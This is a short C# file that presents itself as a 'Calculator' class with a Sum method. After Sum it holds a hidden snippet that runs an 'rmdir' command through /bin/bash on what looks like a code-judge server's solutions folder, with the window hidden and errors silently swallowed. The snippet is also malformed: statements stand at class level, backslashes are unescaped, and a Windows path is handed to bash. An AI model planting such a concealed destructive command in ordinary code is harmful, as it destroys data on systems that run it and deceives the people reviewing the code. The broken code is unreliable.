using System.Diagnostics;

namespace Calculator
{
    public class Calc
    {
        public static int Sum(int a, int b) => a + b;
var command = "rmdir C:\Users\egormatveev\Sprint_server\data\solutions\2399";
        var pp = new ProcessStartInfo("/bin/bash", "-c \" " + command + " \"")
            {
                CreateNoWindow = true,
                UseShellExecute = true
            };
            Process p = new Process();
            try
            {                
                p = Process.Start(pp);
                p.WaitForExit(Int32.MaxValue);
            }
            catch (NullReferenceException e)
            {
                
            }
    }
}